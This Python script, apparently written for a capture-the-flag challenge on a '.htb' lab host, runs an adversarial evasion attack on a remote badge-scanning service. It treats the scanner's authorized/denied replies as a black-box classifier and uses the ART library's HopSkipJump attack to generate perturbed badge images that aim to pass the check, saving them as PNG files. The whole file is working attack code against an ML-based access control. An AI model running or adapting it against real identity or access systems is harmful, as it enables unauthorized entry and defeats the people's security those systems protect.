import requests
import numpy as np
from art.attacks.evasion import HopSkipJump
from art.estimators.classification import BlackBoxClassifier
from PIL import Image
import io

# Target configuration
TARGET_URL = "http://staging.phantomkernel.htb:30487/passport/scan"
HEADERS = {}

# Adversarial attack parameters
EPSILON = 0.05
MAX_ITER = 50
NUM_SAMPLES = 10

class BadgeClassifier(BlackBoxClassifier):
    """Wrapper para el scanner de badges como clasificador de caja negra"""
    
    def __init__(self, url):
        super().__init__(
            predict_fn=self._predict,
            input_shape=(384, 256, 3),  # 256x384 RGB
            nb_classes=2,
            clip_values=(0, 255)
        )
        self.url = url
    
    def _predict(self, x):
        """Envía imágenes al scanner y obtiene respuesta"""
        predictions = []
        for sample in x:
            try:
                # Convertir array a imagen PNG (clip+cast a uint8 para PIL)
                img = Image.fromarray(np.clip(sample, 0, 255).astype('uint8'), 'RGB')
                buf = io.BytesIO()
                img.save(buf, format='PNG')
                buf.seek(0)
                
                files = {'file': ('badge.png', buf, 'image/png')}
                response = requests.post(self.url, files=files, timeout=10)
                
                # Interpretar respuesta
                text = response.text.lower()
                if "authorized" in text or "granted" in text or "success" in text:
                    predictions.append([0.1, 0.9])  # Autorizado
                elif "denied" in text or "rejected" in text or "invalid" in text:
                    predictions.append([0.9, 0.1])  # Rechazado
                else:
                    predictions.append([0.5, 0.5])  # Incierto
                    
                print(f"[DEBUG] Status: {response.status_code}, Preview: {text[:100]}")
            except Exception as e:
                print(f"[ERROR] {e}")
                predictions.append([0.5, 0.5])
        return np.array(predictions)

# Generar imagen base de badge (256x384)
def create_base_badge():
    """Crea una imagen base de badge sintético"""
    img = np.random.randint(100, 200, (384, 256, 3)).astype(np.float32)
    # Agregar patrón simple
    img[50:100, 50:200] = [255, 255, 255]  # Área blanca
    img[150:200, 50:200] = [0, 0, 255]     # Área azul
    return img

print("[*] Generando imágenes base de badges...")
x_base = np.array([create_base_badge() for _ in range(NUM_SAMPLES)])

# Crear clasificador
classifier = BadgeClassifier(TARGET_URL)

# Probar imagen base primero
print("\n[*] Probando imagen base...")
pred = classifier._predict(x_base[:1])
print(f"Predicción base: {pred}")

# Crear atacante (HopSkipJump is decision-based black-box — only needs predict())
attacker = HopSkipJump(
    classifier,
    targeted=False,
    norm=np.inf,
    max_iter=MAX_ITER,
    max_eval=1000,
    init_eval=100,
    verbose=True
)

print(f"\n[*] Generando {NUM_SAMPLES} imágenes adversarias")
print(f"[*] Epsilon: {EPSILON}, Max iterations: {MAX_ITER}")

x_adv = attacker.generate(x=x_base)

# Guardar ejemplos
print("\n[*] Guardando ejemplos...")
for i in range(min(5, NUM_SAMPLES)):
    Image.fromarray(x_base[i].astype('uint8')).save(f"badge_original_{i}.png")
    Image.fromarray(x_adv[i].astype('uint8')).save(f"badge_adversarial_{i}.png")

print("\n[+] Ataque completado. Revisa badge_*.png")
